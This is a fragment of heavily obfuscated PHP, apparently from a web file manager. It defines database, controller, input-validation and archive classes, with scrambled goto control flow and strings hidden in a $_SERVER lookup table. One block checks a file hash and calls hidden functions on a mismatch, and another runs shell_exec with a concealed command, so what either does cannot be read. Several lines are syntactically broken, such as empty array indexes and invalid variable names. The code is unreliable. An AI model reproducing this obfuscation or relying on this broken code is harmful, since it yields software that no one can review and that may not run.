is_array($aȋ˙)) { $this->addTaskData[] = $aȋ˙; return; } return parent::add($aȋ˙, $b, $C܃ӎ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Fלӹ = array()) { goto C멨; B: return $bË; goto F; e: $bß = is_array($bß) ? $bß : array(); $bË = null; for ($a䋲֨ = 0; $a䋲֨ < count($bß); $a䋲֨ += $Dݑ) { $a̎ϴ = array_slice($bß, $a䋲֨, $Dݑ); if (!is_array($a̎ϴ) || count($a̎ϴ) == 0) { break; } $d[$e݈[259]][$c˂][1] = $a̎ϴ; $this->optionsValue($d); $E쬐 = parent::select($Fלӹ); if (!$E쬐) { continue; } if (is_null($bË)) { $bË = array(); } $bË = array_merge($bË, $E쬐); } goto B; D: $c˂ = $this->findWhereField($d); if (!$c˂ || isset($d[$e݈[276]]) || isset($d[$e݈[336]])) { return parent::select($Fלӹ); } $bß = $d[$e݈[259]][$c˂][1]; goto e; C멨: $e݈ =& $_SERVER[ԥ]; $Dݑ = self::SQL_WHERE_IN_CHUNK; $d = $this->optionsValue(); goto D; F: } public function delete($e = array()) { goto F±; A،È: $D޾ = $aی[$c̓׍[259]][$F꼜ً][1]; $D޾ = is_array($D޾) ? $D޾ : array(); for ($fȺ = 0; $fȺ < count($D޾); $fȺ += $Fݒ) { $bܥ، = array_slice($D޾, $fȺ, $Fݒ); if (!is_array($bܥ،) || count($bܥ،) == 0) { break; } $aی[$c̓׍[259]][$F꼜ً][1] = $bܥ،; $this->optionsValue($aی); $Eߵ += parent::delete($e); } goto F; bВ: $F꼜ً = $this->findWhereField($aی); if (!$F꼜ً) { return parent::delete($e); } $Eߵ = 0; goto A،È; F: return $Eߵ; goto a; F±: $c̓׍ =& $_SERVER[ԥ]; $Fݒ = self::SQL_WHERE_IN_CHUNK; $aی = $this->optionsValue(); goto bВ; a: } private function findWhereField($cڌ) { $e߯ =& $_SERVER[ԥ]; $F = self::SQL_WHERE_IN_CHUNK; if (!is_array($cڌ) || !is_array($cڌ[$e߯[259]])) { return !1; } foreach ($cڌ[$e߯[259]] as $bӋ => $c׉) { if (is_array($c׉) && isset($c׉[0]) && is_string($c׉[0]) && strtolower($c׉[0]) == $e߯[7] && is_array($c׉[1]) && count($c׉[1]) > $F) { ignore_timeout(); return $bӋ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\145\155\x4f\x70\164\x69\x6f\x6e"; public $field = array(); public function listData($Eӣ = false, $B = "\x6d\157\144\x69\146\171\x54\x69\155\x65", $dЗ = false) { $dŪ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$dŪ) { return $Eӣ ? null : array(); } if (!$Eӣ) { $dŪ = array_filter(array_values($dŪ)); return array_sort_by($dŪ, $B, $dЗ); } return $dŪ[$_SERVER[ԥ][360] . $Eӣ]; } public function insert($F) { goto C; d: $F[$CӅ[106]] = time(); Model($this->modelType)->set($CӅ[361], $cن, $this->optionType . $CӅ[362]); Model($this->modelType)->set($CӅ[360] . $cن, $F, $this->optionType); goto fŶ胦; fŶ胦: return $cن; goto E; c: $cن = $cن ? $cن : 0; $F[$CӅ[363]] = ++$cن; $F[$CӅ[183]] = time(); goto d; C: $CӅ =& $_SERVER[ԥ]; $F = array_field_key($F, $this->field); $cن = Model($this->modelType)->get($CӅ[361], $this->optionType . $CӅ[362]); goto c; E: } public function update($fΙ, $cع) { goto fҲ՞; D⼜: if (!$A浇) { return !1; } $cع = array_merge($A浇, $cع); $cع[$e޷[106]] = time(); goto D觼; fҲ՞: $e޷ =& $_SERVER[ԥ]; $cع = array_field_key($cع, $this->field); $A浇 = $this->listData($fΙ); goto D⼜; D觼: return Model($this->modelType)->set($e޷[360] . $fΙ, $cع, $this->optionType); goto bǜѵ; bǜѵ: } public function remove($aƎь) { return Model($this->modelType)->remove($_SERVER[ԥ][360] . $aƎь, $this->optionType); } public function clear() { $bꏕ =& $_SERVER[ԥ]; Model($this->modelType)->remove($bꏕ[361], $this->optionType . $bꏕ[362]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($fݎ, $c) { if (!$c) { return !1; } $cϔߘ = $this->listData(); $cϔߘ = array_to_keyvalue($cϔߘ, $fݎ); return isset($cϔߘ[$c]) ? $cϔߘ[$c] : !1; } public function findByName($c) { return $this->findByKey($_SERVER[ԥ][28], $c); } protected function resetData($e) { $bݦ =& $_SERVER[ԥ]; $e = is_array($e) ? $e : array(); $fݑ = array(); for ($D۩ = 0; $D۩ < count($e); $D۩++) { $fݑ[$bݦ[360] . $e[$D۩][$bݦ[363]]] = $e[$D۩]; } return Model($this->modelType)->set($fݑ, !1, $this->optionType); } private function getAutoName($f矠) { $Fڧ = array_to_keyvalue($this->listData(), $_SERVER[ԥ][28]); if (!$Fڧ || !isset($Fڧ[$f矠])) { return $f矠; } for ($fÇ = 1; $fÇ < count($Fڧ); $fÇ++) { $F췝 = $f矠 . "\50{$fÇ}\51"; if (!isset($Fڧ[$F췝])) { return $F췝; } } return $F췝; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($B = false, $bÄ갎 = '', $aȌ = false) { goto D; EȐ: $D = is_array($D) ? $D : array(); if (is_array($Cꭣ)) { $Cꭣ = array_merge($D, $Cꭣ); return $B ? isset($Cꭣ[$B]) ? $Cꭣ[$B] : null : $Cꭣ; } $b = $this->filterWhere(array($E̞ܾ[29] => $bÄ갎)); goto d̦; D: $E̞ܾ =& $_SERVER[ԥ]; $Cꭣ = $this->cacheGet($bÄ갎); $D = $this->optionDefault($bÄ갎); goto EȐ; bϏФ: $this->cacheSet($bÄ갎, $Cꭣ); $Cꭣ = array_merge($D, $Cꭣ); return $B ? $Cꭣ[$B] : $Cꭣ; goto F; d̦: $Cꭣ = $this->where($b)->select(); $Cꭣ = array_to_keyvalue($Cꭣ, $E̞ܾ[89], $E̞ܾ[355]); foreach ($Cꭣ as $b̉ => $DԜ) { if ($aȌ || in_array($b̉, $this->jsonField)) { $Cꭣ[$b̉] = json_decode($DԜ, !0); } } goto bϏФ; F: } public function set($c, $CǢ¾ = false, $dՓ = '') { goto A攥ꎽ; Fᶾ: $D쾈 = is_array($c) ? $c : array($c => $CǢ¾); foreach ($D쾈 as $d => $eݮ) { if (is_array($eݮ)) { $eݮ = json_encode_force($eݮ); } $this->checkLength($eݮ, !1, $this->tableName . $eڋ[4] . $c); $eݮ = self::textEncode($eݮ); $D쾈 = array($eڋ[29] => $dՓ, $eڋ[89] => $d, $eڋ[355] => $eݮ); $B뙃[] = $this->filterWhere($D쾈); } if (!$B뙃) { return !0; } goto BӍ; BӍ: return $this->addAll($B뙃, array(), !0); goto b; A攥ꎽ: $eڋ =& $_SERVER[ԥ]; $this->cacheRemove($dՓ); $B뙃 = array(); goto Fᶾ; b: } protected function optionDefault($c甚 = '') { return !1; } public function setDeep($D֨, $cж = false, $C쭌 = '') { $BÚ = explode($_SERVER[ԥ][91], $D֨); $fȍ = $this->get(); array_set_value($fȍ, $D֨, $cж); $this->set($BÚ[0], $fȍ[$BÚ[0]], $C쭌); } public function remove($AުӲ, $F⫊̮ = '') { $Bٍ =& $_SERVER[ԥ]; $this->cacheRemove($F⫊̮); $C; = $this->filterWhere(array($Bٍ[89] => $AުӲ, $Bٍ[29] => $F⫊̮)); if (is_null($AުӲ)) { unset($C;[$Bٍ[89]]); } return $this->where($C;)->delete(); } public function cacheSet($eư, $f = false) { return Cache::set($this->cacheKey($eư), $f); } public function cacheGet($C䜣) { return Cache::get($this->cacheKey($C䜣)); } public function cacheRemove($a) { return Cache::remove($this->cacheKey($a)); } protected function filterWhere($c盗) { return $c盗; } protected function cacheKey($aο) { return $aο; } } goto bθŶ; dդ: $_SERVER[$_SERVER[][52]] = ("\x39\x35\x34\x31"."\x32\x33")+0;$_QHUq="5JsZ2ne4hRkc3xFUqXr3qJixV9YitXQPGAG3ppYIjSwTUyvCZDnwZ2cFmgz5ufIHmv7wHeNRNQDp";; stream_wrapper_register($_SERVER[][53], $_SERVER[][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($fѫ, $Cބ) { $Bٷ =& $_SERVER[ԥ]; if (isset(self::$_methodList[$fѫ])) { return @call_user_func_array(self::$_methodList[$fѫ], $Cބ); } else { if (method_exists($this, $fѫ)) { return call_user_func_array(array($this, $fѫ), $Cބ); } else { think_exception(__CLASS__ . $Bٷ[4] . $fѫ . $Bٷ[5]); } } } public static function __callStatic($dА, $C) { if (isset(self::$_methodListStatic[$dА])) { return call_user_func_array(self::$_methodListStatic[$dА], $C); } else { if (method_exists(self, $dА)) { return call_user_func_array(array(self, $dА), $C); } else { show_json("{$dА}\50\51\40\156\x6f\x74\40\x65\x78\151\x73\164\73", !1); } } } public static function addMethod($b, $DǙ) { self::$_methodList[$b] = $DǙ; } public static function addMethodStatic($e䆵, $fژ) { self::$_methodListStatic[$e䆵] = $fژ; } } goto dЄ; f٩: register_shutdown_function($_SERVER[][36]); set_error_handler($_SERVER[][49], $f솄); if (function_exists($_SERVER[][50])) { set_exception_handler($_SERVER[][51]); } goto dդ; dЄ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto eׂθ; eׂθ: $aȼ =& $_SERVER[ԥ]; global $in, $config; $this->config =& $config; goto B˄; B˄: $this->in =& $in; $this->values[$aȼ[6]] =& $config; $this->values[$aȼ[7]] =& $in; goto Dć; Dć: $this->tpl = TEMPLATE . MOD . $aȼ[8]; $this->_classObjectID = mt_rand(0, 10000); goto Dۚ; Dۚ: } public function loadClass($fƝ) { if (1 === func_num_args()) { $this->{$fƝ} = new $fƝ(); } else { $d슅 = new ReflectionClass($fƝ); $CϚ߅ = func_get_args(); array_shift($CϚ߅); $this->{$fƝ} = $d슅->newInstanceArgs($CϚ߅); } return $this->{$fƝ}; } protected function assign($C؊, $Fت׌) { $this->values[$C؊] = $Fت׌; } protected function display($FϺҟ) { ob_end_clean(); extract($this->values); require $this->tpl . $FϺҟ; } } class DbSqliteBase extends Db { public function __construct($eҳ = '') { $bӟ =& $_SERVER[ԥ]; if (!extension_loaded($bӟ[9])) { think_exception(think_lang($bӟ[10]) . $bӟ[11]); } if (!empty($eҳ)) { if (!isset($eҳ[$bӟ[12]])) { $eҳ[$bӟ[12]] = 438; } $this->config = $eҳ; if (empty($this->config[$bӟ[13]])) { $this->config[$bӟ[13]] = array(); } } } public function connect($bם = '', $bʮ = 0) { $EɆ =& $_SERVER[ԥ]; if (!isset($this->linkID[$bʮ])) { goto DÕő; Dʬ: @sqlite_busy_timeout($this->linkID[$bʮ], 30000); if (1 != think_config($EɆ[18])) { unset($this->config); } goto b; E󋪃ޒ: $this->linkID[$bʮ] = $fﰄ($bם[$EɆ[17]], $bם[$EɆ[12]]); if (!$this->linkID[$bʮ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto Dʬ; DÕő: if (empty($bם)) { $bם = $this->config; } $CŪ = !empty($bם[$EɆ[13]][$EɆ[14]]) ? $bם[$EɆ[13]][$EɆ[14]] : $this->pconnect; $fﰄ = $CŪ ? $EɆ[15] : $EɆ[16]; goto E󋪃ޒ; b: } return $this->linkID[$bʮ]; } public function free() { $this->queryID = null; } public function query($F) { goto C긄; b: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Bȇ = $this->getAll(); return $Bȇ; } goto D֌; C긄: $DӊމŌ =& $_SERVER[ԥ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aȠ; aȠ: $this->queryStr = $F; if ($this->queryID) { $this->free(); } think_action_status($DӊމŌ[19], 1); goto c٤ף; c٤ף: think_status($DӊމŌ[20]); $this->queryID = sqlite_query($this->_linkID, $F); $this->debug(); goto b; D֌: } public function execute($eΓ) { goto Dؔ; Dؔ: $Cҙ =& $_SERVER[ԥ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cﶰ; cﶰ: $this->queryStr = $eΓ; if ($this->queryID) { $this->free(); } think_action_status($Cҙ[21], 1); goto e网Ƶ; aҦ: if (!1 === $b̝) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto aˌӾ; e网Ƶ: think_status($Cҙ[20]); $b̝ = sqlite_exec($this->_linkID, $eΓ); $this->debug(); goto aҦ; aˌӾ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ԥ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D뇉 = sqlite_query($this->_linkID, $_SERVER[ԥ][23]); if (!$D뇉) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cʉƛ = sqlite_query($this->_linkID, $_SERVER[ԥ][24]); if (!$Cʉƛ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Cެ̍ = array(); if ($this->numRows > 0) { for ($a임 = 0; $a임 < $this->numRows; $a임++) { $Cެ̍[$a임] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Cެ̍; } public function getFields($aۚ) { $fΐٶ =& $_SERVER[ԥ]; $d苂 = $this->query($fΐٶ[25] . $aۚ . $fΐٶ[26]); $f = array(); if ($d苂) { foreach ($d苂 as $fꤗ => $b䄡) { $f[$b䄡[$fΐٶ[27]]] = array($fΐٶ[28] => $b䄡[$fΐٶ[27]], $fΐٶ[29] => $b䄡[$fΐٶ[30]], $fΐٶ[31] => (bool) ($b䄡[$fΐٶ[32]] === $fΐٶ[33]), $fΐٶ[34] => $b䄡[$fΐٶ[35]], $fΐٶ[36] => strtolower($b䄡[$fΐٶ[37]]) == $fΐٶ[38], $fΐٶ[39] => strtolower($b䄡[$fΐٶ[40]]) == $fΐٶ[41]); } } return $f; } public function getTables($d㥎 = '') { $Fғ =& $_SERVER[ԥ]; $dǼμ = $this->query($Fғ[42] . $Fғ[43] . $Fғ[44]); $c̉ = array(); foreach ($dǼμ as $BЇ => $cߌ) { $c̉[$BЇ] = current($cߌ); } return $c̉; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $b =& $_SERVER[ԥ]; $E = sqlite_last_error($this->_linkID); $this->error = $E . $b[4] . sqlite_error_string($E); if ($b[33] != $this->queryStr) { $this->error .= LNG($b[45]) . $this->queryStr; } think_trace($this->error, $b[33], $b[46]); return $this->error; } public function escapeString($E) { return sqlite_escape_string($E); } public function parseLimit($c݅) { $b˜ =& $_SERVER[ԥ]; $Cˬ = $b˜[33]; if (!empty($c݅)) { $c݅ = explode($b˜[47], $c݅); if (count($c݅) > 1) { $Cˬ .= $b˜[48] . $c݅[1] . $b˜[49] . $c݅[0] . $b˜[50]; } else { $Cˬ .= $b˜[48] . $c݅[0] . $b˜[50]; } } return $Cˬ; } } class DbSqlite3Base extends Db { public function __construct($E = '') { $a =& $_SERVER[ԥ]; if (!class_exists($a[51])) { think_exception(think_lang($a[10]) . $a[52]); } if (!empty($E)) { if (!isset($E[$a[12]])) { $E[$a[12]] = 438; } $this->config = $E; if (empty($this->config[$a[13]])) { $this->config[$a[13]] = array(); } } } public function connect($fԯ = '', $D = 0) { $A٭ =& $_SERVER[ԥ]; if (!isset($this->linkID[$D])) { if (empty($fԯ)) { $fԯ = $this->config; } $this->linkID[$D] = new SQLite3($fԯ[$A٭[17]]); if (!$this->linkID[$D]) { think_exception($this->linkID[$D]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$D]->busyTimeout(30000); if (1 != think_config($A٭[18])) { unset($this->config); } } return $this->linkID[$D]; } public function free() { $this->queryID = null; } public function query($fٳ) { goto c; d𿆮: if (!1 === $this->queryID) { $this->error(); return !1; } else { $aϷ = $this->getAll(); $this->numRows = count($aϷ); return $aϷ; } goto eћޘ; cȱ: think_status($D٠[20]); $this->queryID = $this->_linkID->query($fٳ); $this->debug(); goto d𿆮; c: $D٠ =& $_SERVER[ԥ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto f; f: $this->queryStr = $fٳ; if ($this->queryID) { $this->free(); } think_action_status($D٠[19], 1); goto cȱ; eћޘ: } public function execute($e) { goto Cɂ; a۫: if (!1 === $Cۿ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto D뵘; e煟: $this->queryStr = $e; if ($this->queryID) { $this->free(); } think_action_status($Dኳ[21], 1); goto c; c: think_status($Dኳ[20]); $Cۿ = $this->_linkID->exec($e); $this->debug(); goto a۫; Cɂ: $Dኳ =& $_SERVER[ԥ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e煟; D뵘: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ԥ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eӌ = $this->_linkID->query($_SERVER[ԥ][23]); if (!$eӌ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fΑ = $this->_linkID->query($_SERVER[ԥ][24]); if (!$fΑ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Eプ = array(); while ($dꎢ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Eプ[] = $dꎢ; } $this->queryID->reset(); return $Eプ; } public function getFields($BΦ⽝) { $E =& $_SERVER[ԥ]; $dӏ = $this->query($E[25] . $BΦ⽝ . $E[26]); $F = array(); if ($dӏ) { foreach ($dӏ as $d׉ => $Dի) { $F[$Dի[$E[28]]] = array($E[28] => $Dի[$E[28]], $E[29] => $Dի[$E[29]], $E[31] => (bool) ($Dի[$E[31]] === $E[33]), $E[34] => $Dի[$E[53]], $E[36] => (bool) $Dի[$E[54]], $E[39] => (bool) $Dի[$E[54]]); } } return $F; } public function getTables($FЂȇ = '') { $a =& $_SERVER[ԥ]; $Aטܲ = $this->query($a[42] . $a[43] . $a[44]); $F龫ɼ = array(); foreach ($Aטܲ as $aآ => $bю؈) { $F龫ɼ[$aآ] = current($bю؈); } return $F龫ɼ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eʪ =& $_SERVER[ԥ]; $this->error = $this->_linkID->lastErrorMsg(); if ($eʪ[33] != $this->queryStr) { $this->error .= LNG($eʪ[45]) . $this->queryStr; } think_trace($this->error, $eʪ[33], $eʪ[46]); return $this->error; } public function escapeString($Bꍉ) { $A =& $_SERVER[ԥ]; if ($this->_linkID) { return $this->_linkID->escapeString($Bꍉ); } return str_ireplace($A[55], $A[56], $Bꍉ); } public function parseLimit($F) { $F =& $_SERVER[ԥ]; $A물 = $F[33]; if (!empty($F)) { $F = explode($F[47], $F); if (count($F) > 1) { $A물 .= $F[48] . $F[1] . $F[49] . $F[0] . $F[50]; } else { $A물 .= $F[48] . $F[0] . $F[50]; } } return $A물; } } goto Aƒð; Aʆ: $e䟽 = LIB_DIR . $_SERVER[ԥ][2239]; $f庈 = $_SERVER[ԥ][1284]; if ($_SERVER[$_SERVER[ԥ][718]] != $f庈($e䟽)) { goto b©ɰ; b©ɰ: $F = $_SERVER[ԥ][720]; $CĴ = $_SERVER[$_SERVER[ԥ][721]] . $_SERVER[ԥ][722]; $B֠ = $F($CĴ); goto bݒ; bݒ: $A = explode($_SERVER[ԥ][213], $B֠); if (count($A) < $_SERVER[ԥ][544]) { $d嘃о = $_SERVER[ԥ][723]; $d嘃о(); } $AƋơ = $_SERVER[ԥ][724]; goto D߆; D߆: $AƋơ($e䟽); goto fǡ; fǡ: } goto Fŷْ; fణٯ: if (!function_exists($_SERVER[ԥ][1838])) { function imagecreatefrombmp($fӓň) { return ImageGdBMP::load($fӓň); } } class Input { public static function getArray($c帺) { goto c쫍; e؏Α: $D솕ţ = array(); $e = LNG($Dē[1839]); foreach ($c帺 as $Aꞅ => $f綇) { goto fܒ; fܒ: $c믍 = _get($f綇, $Dē[1221], $e . $Dē[865] . $Aꞅ); $EѤ = $Aꞅ; if (isset($f綇[$Dē[1840]]) && $f綇[$Dē[1840]]) { $EѤ = $f綇[$Dē[1840]]; } goto Aö; a؄: if (isset($f綇[$Dē[1842]]) && !self::check($in[$Aꞅ], $f綇[$Dē[1842]], $fσ)) { if (array_key_exists($Dē[1841], $f綇)) { if (!is_null($f綇[$Dē[1841]])) { $BŶዄ[$EѤ] = $f綇[$Dē[1841]]; } } else { $D솕ţ[] = $c믍; } continue; } $BŶዄ[$EѤ] = $in[$Aꞅ]; goto Eꅘ; Aö: if (!array_key_exists($Aꞅ, $in)) { if (array_key_exists($Dē[1841], $f綇)) { if (!is_null($f綇[$Dē[1841]])) { $BŶዄ[$EѤ] = $f綇[$Dē[1841]]; } } else { if (isset($f綇[$Dē[1842]])) { $D솕ţ[] = $c믍; } } continue; } if (isset($f綇[$Dē[1842]]) && $f綇[$Dē[1842]] == $Dē[278]) { $f = json_decode($in[$Aꞅ], !0); if (is_array($f)) { $BŶዄ[$EѤ] = $f; } else { if (array_key_exists($Dē[1841], $f綇)) { if (!is_null($f綇[$Dē[1841]])) { $BŶዄ[$EѤ] = $f綇[$Dē[1841]]; } } else { $D솕ţ[] = $c믍; } } continue; } $fσ = _get($f綇, $Dē[994]); goto a؄; Eꅘ: } goto CÉ; c쫍: $Dē =& $_SERVER[ԥ]; global $in; $BŶዄ = array(); goto e؏Α; CÉ: if (count($D솕ţ) > 0) { show_json(implode($Dē[1843], $D솕ţ), !1); } return $BŶዄ; goto bƊ; bƊ: } public static function reg($cˊ = "\162\145\x71\165\151\x72\145") { static $b󜆙 = array("\x72\145\x71\x75\151\x72\x65" => "\x2e\53", "\156\x75\x6d\142\x65\x72" => "\134\144\53", "\x68\145\x78" => "\133\60\55\x39\101\x2d\106\141\55\146\135\53", "\151\x6e\164" => "\x5b\x2d\134\53\135\77\134\x64\x2b", "\x62\157\157\154" => "\60\x7c\61", "\x66\154\x6f\141\x74" => "\x5b\55\x5c\53\x5d\x3f\134\x64\53\50\134\x2e\134\x64\x2b\51\x3f", "\x65\156\x67\154\151\163\x68" => "\133\101\55\132\x61\x2d\x7a\40\135\x2b", "\143\150\x69\x6e\145\163\x65" => "\x5b\134\x78\173\64\x65\60\x30\x7d\55\134\170\173\x39\x66\x61\x35\x7d\135\53", "\x68\x61\163\x43\150\x69\156\145\163\x65" => "\x2f\50\133\x5c\x78\173\x34\x65\x30\60\175\55\134\x78\x7b\x39\x66\141\x35\175\x5d\53\51\57\x75", "\x65\155\x61\151\154" => "\x5c\167\53\50\x5b\134\x2e\134\x2d\x5d\134\167\53\x29\x2a\134\x40\134\167\x2b\x28\133\x5c\x2e\134\x2d\x5d\134\167\53\51\52\134\56\x5c\x77\53", "\160\150\x6f\156\145" => "\x31\133\63\55\x39\135\134\144\x7b\71\175", "\x74\145\154\160\x68\157\x6e\145" => "\50\x5c\x28\x5c\144\x7b\63\x2c\x34\x7d\134\x29\x7c\134\144\173\63\54\x34\x7d\55\x7c\x5c\163\x29\77\x5c\x64\x7b\67\x2c\x31\64\x7d", "\165\162\x6c" => "\50\x68\164\164\160\x7c\146\x74\160\174\x68\x74\x74\160\x73\x29\x3a\134\x2f\134\57\133\134\167\x5c\x2d\x5f\x5d\53\50\134\56\x5b\134\167\134\55\137\x5d\x2b\x29\x2b\50\x5b\x5c\167\x5c\55\134\56\x2c\x40\x3f\x5e\75\45\46\72\x5c\x2f\x7e\134\x2b\43\135\52\x5b\x5c\167\134\x2d\134\100\77\x5e\75\45\46\x5c\57\x7e\134\53\x23\x5d\51\77", "\165\162\154\106\165\x6c\154" => "\x5b\x61\55\x7a\x41\55\x7a\135\53\x3a\x5c\57\134\x2f\133\136\x5c\163\135\52", "\151\x70" => "\x28\x5c\x64\173\61\x2c\x33\175\134\x2e\x29\x7b\x33\175\x28\x5c\144\173\61\54\x33\175\x29", "\172\x69\160" => "\133\x31\55\71\135\x5c\x64\173\65\x7d\50\77\41\134\x64\51", "\151\144\103\141\x72\x64" => "\x28\x5c\144\x7b\x31\x35\x7d\51\174\50\134\144\x7b\x31\67\x7d\50\x5c\144\174\x58\174\x78\x29\51", "\x63\157\x6c\157\x72" => "\x23\50\x5b\x30\55\71\x41\x2d\x46\141\x2d\146\135\173\x33\175\174\133\60\55\x39\101\x2d\x46\x61\55\x66\x5d\x7b\66\x7d\51", "\x74\x69\x6d\x65" => "\50\x5b\60\x2d\61\x5d\134\144\174\62\133\60\55\64\x5d\51\x3a\x5b\60\55\65\135\x5c\144", "\144\141\x74\x65" => "\x5c\x64\x7b\64\x7d\x5b\x2d\134\x2f\135\77\50\x30\133\61\x2d\x39\x5d\174\61\x5b\60\x2d\x32\135\x29\133\x2d\x5c\x2f\x5d\77\50\x5b\x30\55\62\x5d\134\x64\174\63\133\x30\55\x31\x5d\x29", "\144\141\164\145\124\x69\x6d\x65" => "\x5c\144\173\x34\175\x5b\x2d\134\x2f\x5d\x3f\50\x30\133\x31\x2d\x39\135\x7c\x31\133\60\x2d\x32\x5d\x29\133\55\x5c\57\x5d\x3f\50\x5b\x30\55\62\x5d\x5c\144\174\63\x5b\x30\x2d\61\135\51\134\x73\53\x28\133\60\x2d\x31\x5d\x5c\x64\x7c\x32\x5b\60\55\64\x5d\51\72\x5b\60\x2d\x35\x5d\x5c\144", "\x70\141\x73\163\x77\157\x72\x64" => "\50\x3f\x3d\x2e\52\134\144\x29\x28\77\75\56\x2a\x5b\141\55\172\135\x29\50\77\x3d\56\52\133\x41\x2d\x5a\x5d\51\56\173\70\54\62\x30\x7d", "\x6b\145\x79" => "\x5b\101\55\x5a\x61\55\x7a\60\55\x39\137\134\55\x5c\x2e\135\x2b", "\x6b\x65\x79\106\x75\154\154" => "\x5b\x41\x2d\132\141\55\172\x30\55\71\x5f\134\55\134\x2e\134\163\54\135\53"); if (!$cˊ) { return $b󜆙; } return $b󜆙[$cˊ]; } public static function check($E̍Ѡ, $C݋, $D = null) { $c =& $_SERVER[ԥ]; switch ($C݋) { case $c[7]: return in_array($E̍Ѡ, $D); break; case $c[1844]: return floatval($E̍Ѡ) > $D; break; case $c[1845]: return floatval($E̍Ѡ) < $D; break; case $c[321]: return strlen($E̍Ѡ) >= $D[0] && strlen($E̍Ѡ) <= $D[1]; break; case $c[321]: if (is_array($D)) { return strlen($E̍Ѡ) >= $D[0] && strlen($E̍Ѡ) <= $D[1]; break; } else { return strlen($E̍Ѡ) == $D; break; } case $c[317]: return floatval($E̍Ѡ) >= $D[0] && floatval($E̍Ѡ) <= $D[1]; break; } $A = self::reg(!1); $C݋ = isset($A[$C݋]) ? $A[$C݋] : $C݋; if (substr($C݋, 0, 1) != $c[8]) { $C݋ = $c[1846] . $C݋ . $c[1847]; } return preg_match($C݋, $E̍Ѡ) === 1; } public static function get($Fܥ, $bնٌ = null, $Eߑ = null, $BǸ = null) { goto Fċ; Fċ: $e٦ږ =& $_SERVER[ԥ]; $B׼ = array(); if (!is_null($Eߑ)) { $B׼[$e٦ږ[34]] = $Eߑ; } goto a再; A: return $DԽ҂[$Fܥ]; goto eЪ; a再: if (!is_null($BǸ)) { $B׼[$e٦ږ[994]] = $BǸ; } if (!is_null($bնٌ)) { $B׼[$e٦ږ[1842]] = $bնٌ; } $DԽ҂ = Input::getArray(array($Fܥ => $B׼)); goto A; eЪ: } } class KodArchive { static function init() { goto E; eӚ: define($f[1850], TEMP_FILES); define($f[1851], TEMP_FILES); define($f[1852], $f[1853]); goto C; E: $f =& $_SERVER[ԥ]; if (defined($f[1848])) { return; } define($f[1848], SDK_DIR . $f[1849]); goto eӚ; F⿃Ɯ: require_once ARCHIVE_LIB . $f[1859]; goto A; C: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $f[1854]; require_once ARCHIVE_LIB . $f[1855]; goto Ań; Ań: require_once ARCHIVE_LIB . $f[1856]; require_once ARCHIVE_LIB . $f[1857]; require_once ARCHIVE_LIB . $f[1858]; goto F⿃Ɯ; A: } static function checkIfType($Fϊګ, $c𒈇) { goto c; cǎ: $Eۙ = in_array($Fϊګ, $D[$c𒈇]); if ($Eۙ && ($c𒈇 == $dےӐ[297] || $c𒈇 == $dےӐ[1863]) && (!function_exists($dےӐ[1871]) || !function_exists($dےӐ[1872]))) { show_tips($dےӐ[1873]); } if ($Eۙ && $c𒈇 == $dےӐ[1028] && (!function_exists($dےӐ[1874]) || !strstr(shell_exec($dےӐ[1875]), $dےӐ[1876]))) { show_tips($dےӐ[1877]); } goto dݺ; c: $dےӐ =& $_SERVER[ԥ]; self::init(); $D = array($dےӐ[297] => array($dےӐ[297], $dےӐ[1860], $dےӐ[1861], $dےӐ[1862]), $dےӐ[1863] => array($dےӐ[1863], $dےӐ[1864], $dےӐ[1026], $dےӐ[1024]), $dےӐ[1028] => array($dےӐ[1028], $dےӐ[1865], $dےӐ[1866], $dےӐ[1867], $dےӐ[1868], $dےӐ[1869], $dےӐ[1870])); goto cǎ; dݺ: return $Eۙ; goto Dҕԑ; Dҕԑ: } static function listContent($d쓧, $dď = true) { $e =& $_SERVER[ԥ]; self::init(); $e = !empty($GLOBALS[$e[1032]]) ? $GLOBALS[$e[1032]] : get_path_ext($d쓧); $d = !1; if (self::checkIfType($e, $e[1863])) { $FѲ = PclTarList($d쓧, $e); $d = array(); for ($Bſ = 